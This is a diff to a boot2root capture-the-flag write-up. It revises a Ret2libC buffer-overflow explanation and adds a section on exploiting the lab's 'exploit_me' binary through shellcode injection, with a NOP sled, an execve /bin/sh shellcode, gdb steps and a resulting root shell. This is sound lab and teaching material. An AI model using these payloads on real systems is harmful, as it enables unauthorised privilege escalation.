@@ -3,14 +3,15 @@
 ## Table of content
 
 - [boot2root](#boot2root)
-	- [Table of content](#table-of-content)
-	- [Introduction](#introduction)
-	- [Finding the IP Address](#finding-the-ip-address)
-	- [Enumeration](#enumeration)
-	- [Gaining Access](#gaining-access)
-		- [Writeup 1](#writeup-1)
-		- [Writeup 2](#writeup-2)
-		- [Writeup 3](#writeup-3)
+  - [Table of content](#table-of-content)
+  - [Introduction](#introduction)
+  - [Finding the IP Address](#finding-the-ip-address)
+  - [Enumeration](#enumeration)
+  - [Gaining Access](#gaining-access)
+    - [Writeup 1](#writeup-1)
+    - [Writeup 2](#writeup-2)
+    - [Writeup 3](#writeup-3)
+    - [Writeup 4](#writeup-4)
 
 ## Introduction
 
@@ -476,18 +477,15 @@ In order to exploit the buffer overflow, we also need to take the system archite
 
 [Buffer Overflow Source 3](https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf)
 
-I'll skip the explanation of a buffer overflow as this is way better explained in the sources above.
+In our case, we are gonna perform a so called `Ret2libC` attack.
+We need a function from the C standard library (LIBC) in order to perform the attack, which will be the `system()` in our case.
 This is the code which successfully exploits the buffer overflow in the `exploit_me` program:
 ```
 ./exploit_me `python -c 'print "A"*140+"\x60\xb0\xe6\xb7"+"DUMM"+"\x58\xcc\xf8\xb7"'`
 ```
 The size of the buffer is 140 bytes. Meaning that if we exceeded those 140 bytes and the string encroaches beyond its buffer, resulting in a segmentation fault as shown in the picture above. This means that we can inject malicious payloads in order to make the program to behave unexpectedly and potential gain access to a shell.
 
-What we basically are doing is creating a fake function stack frame. We will overwrite with the payload above the buffer and saved frame pointers with a bunch of `A`.
-
-<p align="center">
-  <img src="https://blog.tallan.com/wp-content/uploads/2019/03/Overflowing-a-buffer-with-injected-code.png">
-</p>
+What we basically are doing is creating a fake function stack frame. We will overwrite with the payload above the buffer and saved frame pointers with a bunch of `A`. The return address will point to the `system()` Libc function and start the shell.
 
 The first thing we need is the address of the system function(first address in the payload).
 Inside gdb, we run the program adn trigger the buffer overflow:
@@ -517,7 +515,7 @@ And again we need to convert it to a big endian.
 0xb7f8cc58 -> 58CCF8B7
 ```
 
-The `DUMM` string between those two address is there because of the system architecture of b2r, which requires to have some dummy data between the `system()` and `/bin/sh` call.
+The `DUMM` string between those two address is there because of the system architecture of b2r, which requires to have some dummy data as an offset of 4 bytes between the `system()` and `/bin/sh` call, which will also essential be the pointer to the `/bin/sh` string.
 The payload is ready, let's execute is outside of the gdb:
 ```
 zaz@BornToSecHackMe:~$ ./exploit_me `python -c 'print "A"*140+"\x60\xb0\xe6\xb7"+"DUMM"+"\x58\xcc\xf8\xb7"'`
@@ -624,3 +622,97 @@ It will take a bit, but after a few seconds we get successfully the root shell:
 </p>
 
 We finally booted boot2root to root! :)
+
+### Writeup 4
+
+In the very first writeup we gained root via a buffer overflow Ret2LibC attack.
+In this writeup we gonna exploit the buffer overflow with a shellcode injection attack.
+This antique(1996) Phrack Blog entry ["Smashing The Stack For Fun And Profit"](http://phrack.org/issues/49/14.html) provides great information.
+
+This is our exploit payload:
+```
+`python -c 'print "\x90" * 95 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\xbc\xf8\xff\xbf"'`
+```
+
+Let's break it down.
+First we need a NOP-sled -> `"\x90" * 95`.
+A NOP-sled is a sequence of NOP (no-operation) instructions meant to "slide" the CPU's instruction execution flow to the next memory address. Anywhere the return address lands in the NOP-sled, it's going to slide along the buffer until it hits the start of the shellcode.
+NOP-values may differ per CPU, but for the OS and CPU we're aiming at, the NOP-value is `\x90`.
+
+With a shellcode of 46 bytes and a buffer of 141 bytes(in order to trigger the buffer overflow), we have 95 bytes left to fill, which is the reason we multiple the NOP-sled times 95.
+
+But what is a shellcode you may ask?
+A shellcode has nothing to do with shell scripting. The term “shellcode” was historically used to describe code executed by a target program due to a vulnerability exploit and used to open a remote shell – that is, an instance of a command line interpreter – so that an attacker could use that shell to further interact with the victim’s system. It usually only takes a few lines of code to spawn a new shell process, so popping shells is a very lightweight, efficient means of attack, so long as we can provide the right input to a target program.
+
+We are using the following shellcode:
+```
+\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
+```
+You can use of course different shellcodes, maybe a even lighter one than my 46 bytes shellcode that I took over from the Phrack article or even for different OS architectures.
+The best site to find shellcode's for your needs is [Shell-Storm](http://shell-storm.org/shellcode/)
+
+Last but not least we need the stack pointer address. I explain why we need it in a second.
+
+Let's first disassemble the main:
+```
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x080483f4 <+0>:     push   %ebp
+   0x080483f5 <+1>:     mov    %esp,%ebp
+   0x080483f7 <+3>:     and    $0xfffffff0,%esp
+   0x080483fa <+6>:     sub    $0x90,%esp
+   0x08048400 <+12>:    cmpl   $0x1,0x8(%ebp)
+   0x08048404 <+16>:    jg     0x804840d <main+25>
+   0x08048406 <+18>:    mov    $0x1,%eax
+   0x0804840b <+23>:    jmp    0x8048436 <main+66>
+   0x0804840d <+25>:    mov    0xc(%ebp),%eax
+   0x08048410 <+28>:    add    $0x4,%eax
+   0x08048413 <+31>:    mov    (%eax),%eax
+   0x08048415 <+33>:    mov    %eax,0x4(%esp)
+   0x08048419 <+37>:    lea    0x10(%esp),%eax
+   0x0804841d <+41>:    mov    %eax,(%esp)
+   0x08048420 <+44>:    call   0x8048300 <strcpy@plt>
+   0x08048425 <+49>:    lea    0x10(%esp),%eax
+   0x08048429 <+53>:    mov    %eax,(%esp)
+   0x0804842c <+56>:    call   0x8048310 <puts@plt>
+   0x08048431 <+61>:    mov    $0x0,%eax
+   0x08048436 <+66>:    leave
+   0x08048437 <+67>:    ret
+```
+Set a breakpoint at the return statement:
+```
+(gdb) br *0x08048437
+Breakpoint 1 at 0x8048437
+```
+Run the payload with an improvised stack pointer:
+```
+r `python -c 'print "\x90" * 95 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x45\x45\x45\x45"'`
+```
+
+Inspect the stack pointer:
+```
+(gdb) x/300wx $esp
+```
+TODO: IMAGE STACK POINTER REGISTER
+
+The left-most column in this image contains the memory address of the stack pointer. By using it we will know the runtime memory addresses that contain the payload. This means we can pick an address somewhere in the NOP-sled for the return address to point to. In my case I went with `0xbffff8bc`. We will replace the improvised address `\x45\x45\x45\x45` with the new address and of course we need to change the address to a Payload write direction:
+```
+0xbffff8bc -> \xbc\xf8\xff\xbf
+```
+Here is a visualization of how the attack will look inside the memory:
+<p align="center">
+  <img src="https://blog.tallan.com/wp-content/uploads/2019/03/Overflowing-a-buffer-with-injected-code.png">
+</p>
+
+Let's run the exploit and it worked! The root shell got spawned!
+```
+zaz@BornToSecHackMe:~$ ./exploit_me `python -c 'print "\x90" * 95 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\xbc\xf8\xff\xbf"'`
+������������������������������������������������������������������������������������������������^�1��F�F
+                                                                                                        �
+                                                                                                         ����V
+                                                                                                              1ۉ�@�����/bin/sh����
+# whoami
+root
+# id
+uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
+```
